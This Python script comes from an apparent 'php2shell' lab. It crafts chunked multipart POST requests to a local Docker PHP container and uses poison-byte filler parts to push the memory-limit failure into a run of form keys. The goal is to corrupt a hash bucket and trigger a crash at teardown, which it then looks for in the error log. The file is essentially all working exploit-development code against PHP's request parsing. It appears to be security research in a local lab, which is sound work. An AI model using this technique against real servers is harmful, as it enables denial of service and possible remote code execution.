#!/usr/bin/env python3
"""php2shell lab, oom12: sweep the wall INTO the key run.

Evidence: strikes reach peak == memory_limit exactly (chunk-rounded) but the
1020-parts cap ends parsing at the same breath -> never CROSS. Key budget
~1.4MB (523 keys x ~2.9KB) — cutting fill by whole units (128KB) moves the
wall byte-position into the key run; inside the transition unit, 256B steps
slide the wall across value(2048)/param(1016)/key(328)/bucket(36) slices.
alloc=328 strike = malformed bucket w/ poison bytes -> teardown deref.
"""

import re
import socket
import subprocess
import sys
import time

HOST = "127.0.0.1"
BOUNDARY = "b" + "X" * 20
POISON = b"\x08"
UNIT = 128 * 1024
KEYVAL = 2048
KEYRUN = 3000
BIGFREE = 256 * 1024
U_OK, R_OK = 475, 65511          # calibrated oom6-11: fresh-heap edge


def part(name: bytes, value: bytes) -> bytes:
    head = (
        f"--{BOUNDARY}\r\n"
        f'Content-Disposition: form-data; name="'
    ).encode() + name + b'"\r\n\r\n'
    return head + value + b"\r\n"


def restart():
    subprocess.run(["docker", "restart", "php_vuln"], capture_output=True, timeout=60)
    time.sleep(1.5)


def send(port: int, parts: list[bytes], path: str = "index.php") -> tuple[bool, str]:
    body = b"".join(parts) + b"--" + BOUNDARY.encode() + b"--\r\n"
    s = socket.create_connection((HOST, port), timeout=300)
    s.sendall(
        (
            f"POST /{path} HTTP/1.1\r\nHost: {HOST}\r\n"
            f"Content-Type: multipart/form-data; boundary={BOUNDARY}\r\n"
            f"Transfer-Encoding: chunked\r\nConnection: close\r\n\r\n"
        ).encode()
    )
    for i in range(0, len(body), 65536):
        c = body[i:i + 65536]
        s.sendall(f"{len(c):x}\r\n".encode() + c + b"\r\n")
    s.sendall(b"0\r\n\r\n")
    resp = b""
    while True:
        try:
            d = s.recv(65536)
        except socket.timeout:
            break
        if not d:
            break
        resp += d
    s.close()
    t = resp.decode("utf-8", "replace")
    return ("Fatal error" in t), t


def fatal_n(text: str):
    m = re.search(r"tried to allocate (\d+) bytes", text)
    return int(m.group(1)) if m else None


def build(fill_units: int, rem: int, keyrun: int = 0) -> list[bytes]:
    big = POISON * BIGFREE
    ps = [part(b"b0", big), part(b"b0", big)]
    fill = POISON * UNIT
    for i in range(fill_units):
        ps.append(part(b"u%d" % i, fill))
    if rem > 0:
        ps.append(part(b"r", POISON * rem))
    kv = POISON * KEYVAL
    for k in range(keyrun):
        ps.append(part(POISON * (300 + k), kv))
    return ps


def main():
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 8081
    log = lambda *a: print(*a, flush=True)

    # coarse: drop whole units until a strike fatals
    hit = None
    for drop in range(0, 9):
        restart()
        fatal, text = send(port, build(U_OK - drop, R_OK if drop == 0 else UNIT - 1024, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        log(f"coarse drop={drop}: fatal={fatal} alloc={n}")
        if fatal:
            hit = (U_OK - drop, (UNIT - 1024) if drop else R_OK)
            break
    if not hit:
        log("no fatal in 0..8 unit drops; revisit budget")
        return
    units, rem = hit
    # fine: 256B steps shrinking rem (wall slides across key-run slices)
    for d in range(0, UNIT, 256):
        r = rem - d
        if r < 0:
            break
        restart()
        fatal, text = send(port, build(units, r, keyrun=KEYRUN))
        n = fatal_n(text) if fatal else None
        tag = "  *** KEY/HASH CROSSING ***" if (fatal and n and n < 428) else ""
        log(f"fine d={d}: fatal={fatal} alloc={n}{tag}")
        if tag:
            log(text[:300])
            break
    log("done — check error.log for 'exit signal Segmentation'")


if __name__ == "__main__":
    main()
